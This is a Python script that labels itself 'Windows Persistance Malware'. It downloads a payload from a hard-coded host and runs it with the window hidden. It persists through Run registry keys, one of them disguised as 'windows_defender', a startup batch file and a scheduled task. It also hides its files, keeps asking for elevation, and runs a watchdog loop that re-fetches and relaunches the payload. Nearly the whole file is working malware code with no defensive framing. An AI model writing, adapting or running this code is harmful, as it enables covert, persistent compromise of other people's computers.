import requests , shutil,subprocess ,os , sys ,os.path , platform ,wmi ,ctypes,socket,platform,time
from sys import platform
import ctypes, os , random , string , win32serviceutil ,win32gui, win32con
try:
    import _winreg as winreg
except ImportError:
    import winreg
    
#--------- Status 
info = ("[!]")
oka = ("[+]")
fai = ("[X]")
err = ("[?]")
inpu = ("[-]")
kaz = ("kAz Script")

#------  Settings 
sysdriv = os.getenv("SystemDrive")
curruse = os.getlogin()
Mypayload = "win32services.exe" 
storageplace  = 'logs' 
Installdir = os.environ["APPDATA"]+'\{}'.format(storageplace)
Myschxml = 'WinService.xml'
servicename = 'WinService'
TMPath = os.environ["TMP"]
payloadURL = 'http://192.168.100.240/ts/0/webpassview.bat'
xmlfileURL = 'http://192.168.100.240/ts/0/WinService.exe'
keyreg1 = 'System_persistance'
keyreg2 = 'windows_defender'

#------- create folder for the payload 
def makedir():
    sysdriv = os.getenv("SystemDrive")
    try :
        os.mkdir('{}'.format(Installdir))
    except FileExistsError : 
        print("{} already exists {}".format(info,Installdir))

#-------- Downloader the payload from URL 
def Downloaderpayload():
    url = '{}'.format(payloadURL)
    r = requests.get(url, allow_redirects=True)
    opens= open(r"{}\\{}".format(Installdir,Mypayload), 'wb').write(r.content)
    print("{} Downloaded Pyaload {} ".format(oka,Mypayload))

#-------- Hidden execute payload 
def executepayload():
    SW_HIDE = 0
    info = subprocess.STARTUPINFO()
    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
    info.wShowWindow = SW_HIDE
    subprocess.Popen(r"{}\\{}".format(Installdir,Mypayload),startupinfo=info)

#-------- check if the payload & path are exists 
def checkpayload():
        while True :
            if os.path.isfile("{}\{}".format(Installdir,Mypayload)) : 
                print("{} Folder & File is exist ".format(oka,Mypayload))
                break
            else :
                print("{} Folder & File doesn't exist".format(oka))
                print("{} Re-downloading the payload ".format(err))
                makedir()
                Downloaderpayload()
                continue

#-------- Check process if running or not 
def process_exists(Mypayload): 
        call = 'TASKLIST', '/FI', 'imagename eq %s' % Mypayload
        output = subprocess.check_output(call).decode()
        last_line = output.strip().split('\r\n')[-1]
        return last_line.startswith(Mypayload.lower())
    
#-------- melt
def meltFile():
    # ignore if the path is in appdata as well
    if not (os.getcwd() == Installdir) and not (os.getcwd() == Installdir):
        # if folder already exists 
        try:
            makedir()
        except:
            pass
        strNewFile = os.path.join(Installdir, os.path.basename(sys.argv[0]))
        strCommand = f"timeout 2 & copy /y {os.path.realpath(sys.argv[0])} {strNewFile} & cd /d {Installdir}\\ & {strNewFile}"
        if os.path.isfile("{}".format(strNewFile)) : 
            print("{} Already copied the Persistance file in instell drive ".format(info))
        else : 
              subprocess.Popen(strCommand, shell=True)
              print("{} successful copy Persistance file".format(info))
              
        

#-------- Key register 
def startup_keyreg(key, value):
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)

    with reg_key:
        if value is None:
            winreg.DeleteValue(reg_key, key)
        else:
            if '%' in value:
                var_type = winreg.REG_EXPAND_SZ
            else:
                var_type = winreg.REG_SZ
            winreg.SetValueEx(reg_key, key, 0, var_type, value)


#-------- Bat Startup 
batpath = os.environ["APPDATA"]+'\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.bat'
strNewFile = os.path.join(Installdir, os.path.basename(sys.argv[0]))
def batstartup(file_path=batpath):
    if not (os.getcwd() == batpath) and not (os.getcwd() == batpath):
        print("{} batch startup file doesn't exist".format(err))
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % curruse
        with open(bat_path + '\\' + "startup.bat", "w+") as bat_file:
            bat_file.write(r'@echo off  start  %s' % strNewFile)
            print("{} batch startup created ".format(oka)) 
    else :
        print("{} batch startup file exist [installed] ".format(oka)) 

#-------- schtasks 

def schtasks () :
    def getxml():
        try : 
            url = '{}'.format(xmlfileURL)
            r = requests.get(url, allow_redirects=True)
            opens= open(r"{}\\{}".format(Installdir,Myschxml), 'wb').write(r.content)
            print("{} Downloaded XML file {} ".format(oka,Myschxml))
        except FileNotFoundError : 
            print("Make sure URL valid :: file cannot download")
    if os.path.isfile("{}\{}".format(Installdir,Myschxml)) :
        print("{} XML file is already exist".format(info))
        os.system("schtasks /create /xml {}\\{} /tn {}".format(Installdir,Myschxml,servicename))
        os.system("del {}\\{}".format(Installdir,Myschxml))
        os.system("schtasks /run /tn {}".format(servicename))
    else : 
        getxml() 
        os.system("schtasks /create /xml {}\\{} /tn {}".format(Installdir,Myschxml,servicename))
        os.system("del {}\\{}".format(Installdir,Myschxml))
        os.system("schtasks /run /tn {}".format(servicename))
#-------- ask priv 

def checkpriv():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False


#-------- hidden itself

def hiddenitself():
    hide = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hide , win32con.SW_HIDE)
    os.system("attrib +h +s {}".format(Installdir))
    os.system("attrib +h +s {}\\{}".format(Installdir,Mypayload))
    os.system("attrib +h +s {}\\{}".format(Installdir,os.path.basename(sys.argv[0])))



#-------- Starting Persistence malware 
hiddenitself()
print("\n | Windows Persistance Malware | \n        {} ## {} ".format(kaz , curruse)) 
strNewFile = os.path.join(Installdir, os.path.basename(sys.argv[0]))
startup_keyreg('{}'.format(keyreg1), '{}\\{}'.format(Installdir,Mypayload))
startup_keyreg('{}'.format(keyreg2),'{}'.format(strNewFile))

#--------- check the service is already installed or not
 
try: 
                win32serviceutil.QueryServiceStatus('{}'.format(servicename))
except:
        print("{} Windows service NOT installed".format(err))
        print("[Waiting] running install service")
        if checkpriv() : 
            print("{} priv :: [{}]".format(info,curruse))
            schtasks()
            print("{} successful register the service".format(oka))
                    
        else : 
            while True : 
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                print("{} priv :: [{}]".format(info,curruse))
                print("{} Failed register the service".format(err))
                schtasks
                time.sleep(1800)
                continue
          
else:
    print("{} Windows service installed".format(oka))


while True :

    if process_exists(Mypayload) :
        print("{} successful execute {} ".format(oka,Mypayload))
        print("{} Process is work ".format(oka))
        time.sleep(20)
        continue
    else :
        print("{} Process doesn't run ".format(err))
        checkpayload()
        executepayload()
        meltFile()
        batstartup()
        print("{} Process is running now ".format(info))
    time.sleep(20)

#------END Program | What u looking for ?

